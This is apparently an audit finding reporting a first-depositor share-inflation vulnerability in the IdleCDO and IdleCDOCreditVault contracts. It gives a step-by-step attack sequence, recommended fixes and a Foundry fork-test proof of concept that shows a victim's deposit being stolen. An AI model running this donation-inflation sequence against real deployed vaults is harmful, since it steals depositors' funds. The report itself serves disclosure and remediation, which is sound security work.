### Title
First-depositor share inflation via direct token donation lets an attacker steal a victim's deposit in `IdleCDO`/`IdleCDOCreditVault` - (File: contracts/IdleCDO.sol, contracts/IdleCDOCreditVault.sol)

### Summary
Tranche price is computed as `lastTrancheNAV * ONE_TRANCHE_TOKEN / trancheSupply`, while NAV is derived from the actual contract token balance via `getContractValue()`. Because anyone can transfer `token` directly to the CDO/credit-vault contract, an unprivileged attacker who is the first depositor of a tranche can donate a large amount, inflate the tranche price, and cause the next depositor's shares to round down to (near) zero. The victim's underlying is then absorbed into NAV and can be redeemed by the attacker's inflated share.

### Finding Description
In `_deposit` (IdleCDO.sol:234-264, IdleCDOCreditVault.sol:191-212) the flow is:

1. `_updateAccounting()` prices the tranche from current `getContractValue()` NAV, which includes raw `_contractTokenBalance(token)` — i.e., donated tokens count as a "gain".
2. `_mintSharesAtCurrPrice` mints `_amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche)` with a pure division and no minimum-shares check, no virtual shares, and no initial burn.
3. `_mintShares` credits the full deposited `_underlyings` to `lastNAVAA`/`lastNAVBB` even if `_minted == 0`.

Attack sequence in the buffer/pre-start phase (epoch not running, or IdleCDO any time, attacker is a KYC-passing lender):

1. Vault is fresh: `trancheSupply == 0`. Attacker calls `depositAA(1 wei)` → minted `1 * ONE / oneToken = 1` share, `lastNAVAA = 1`.
2. Attacker directly transfers `D` (e.g., 1,000,000e6 USDC) to the vault contract. No skim/donation-exclusion mechanism isolates it — `getContractValue()` counts it as NAV.
3. Victim calls `depositAA(X)` where `X < D`. `_updateAccounting` sees `totalGain = D`, all gain goes to the only tranche with supply (attacker's), so `priceAA ≈ D + 1`. Then `_minted = X * ONE / (D+1)` — for `X < D`, this can be `0` or a dust amount, yet `lastNAVAA += X`.
4. Attacker calls `withdrawAA(1)`: `toRedeem = 1 * priceAA / ONE ≈ lastNAVAA` which now includes the victim's `X`. `_liquidate` pulls funds from the strategy if unlent balance is insufficient.

Existing guards do not stop this: `_guarded` only caps deposits, `_checkSameBlock`/`_updateCallerBlock` only block the *same caller* depositing and withdrawing in one block (the attacker deposits/donates in an earlier block), `_checkDefault` watches strategy price (unchanged), and `skipDefaultCheck`/`Default` are irrelevant because the "gain" is positive. The credit vault's `_virtualPriceAux` (IdleCDOCreditVault.sol:287-336) assigns the full `totalGain` to the sole live tranche, and there is no `_skimDonatedAssets` exclusion on the deposit path.

### Impact Explanation
Direct theft: the victim receives `0` (or dust) tranche tokens for a deposit of `X` underlying, and the attacker redeems their single inflated share for `≈ X + D + 1`, recovering the donation and pocketing the victim's deposit (minus performance `fee` on the gain). Loss for the victim is up to 100% of their deposit; attacker cost is only gas plus the fee haircut on their own donation, which they recapture.

### Likelihood Explanation
Requires the attacker to be the first depositor of a tranche and to front-run/anticipate a victim deposit in the same tranche. This is a one-time setup condition at vault/tranche initialization (or after a full wipe resets supply), so likelihood is bounded but the window is real for every newly deployed credit vault or CDO. A KYC-passing lender qualifies as an unprivileged attacker per the threat model. High impact when exploitable.

### Recommendation
Mint at a protected price or enforce a minimum-mint invariant:

- On the first mint for a tranche (`trancheSupply == 0`), mint a fixed `INITIAL_BURN_AMOUNT` of shares to a dead address, or add virtual-share offset to `_virtualPriceAux`/`_mintSharesAtCurrPrice`.
- Alternatively/reliably: revert in `_deposit`/`_mintSharesAtCurrPrice` when `_minted == 0` for `_amount > 0`, so a victim can never fund NAV without receiving shares.
- Exclude unsolicited direct transfers from `getContractValue()` (skim donated balance into `unclaimedFees` or a separate accounting bucket) so donations cannot move the mint price.

### Proof of Concept
Foundry fork test sketch (against a freshly deployed `IdleCDOCreditVault`/IdleCDO on a mainnet fork, USDC as `token`):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCDO} from "contracts/IdleCDO.sol";
import {IERC20Detailed} from "contracts/interfaces/IERC20Detailed.sol";
import {IdleCDOTranche} from "contracts/IdleCDOTranche.sol";

contract FirstDepositorInflationTest is Test {
    IdleCDO cdo;          // freshly deployed/initialized CDO (epoch buffer phase)
    IERC20Detailed usdc;  // underlying

    address attacker = address(0xA11CE); // KYC-passing lender
    address victim   = address(0xB0B);   // KYC-passing lender

    function testDonationInflationStealsVictimDeposit() public {
        uint256 D = 1_000_000e6; // donation
        uint256 X = 500_000e6;   // victim deposit (< D)

        deal(address(usdc), attacker, D + 1);
        deal(address(usdc), victim, X);
        // whitelist both via Keyring mock / mockKeyring isWalletAllowed = true

        // 1. attacker first deposit: 1 wei -> 1 share
        vm.startPrank(attacker);
        usdc.approve(address(cdo), type(uint256).max);
        cdo.depositAA(1);
        assertEq(IdleCDOTranche(cdo.AATranche()).balanceOf(attacker), 1);

        // 2. donation inflates priceAA
        usdc.transfer(address(cdo), D);
        vm.stopPrank();

        // 3. victim deposits; minted rounds to ~0 but NAV credited
        vm.startPrank(victim);
        usdc.approve(address(cdo), type(uint256).max);
        cdo.depositAA(X);
        uint256 victimShares = IdleCDOTranche(cdo.AATranche()).balanceOf(victim);
        assertEq(victimShares, 0); // or dust
        vm.stopPrank();

        // 4. attacker redeems 1 share for ~ lastNAVAA (includes victim's X)
        vm.prank(attacker);
        uint256 balBefore = usdc.balanceOf(attacker);
        cdo.withdrawAA(1);
        uint256 gained = usdc.balanceOf(attacker) - balBefore;
        assertGt(gained, D); // attacker recovers donation AND victim's X
    }
}
```

Key assertion: `victimShares == 0` while `lastNAVAA` increased by `X`, and the attacker's single share redeems more than its donation — a quantified theft equal to the victim's full deposit.

Caveats: the PoC assumes the `token` used is freely transferable to the vault (standard ERC20), the guarded-launch limit (`_guarded`) doesn't cap the victim deposit, and a fork where the strategy's `redeemUnderlying`/`deposit` path is live; on vaults where deposits are epoch-gated, the attack must land in the buffer window before `startEpoch`.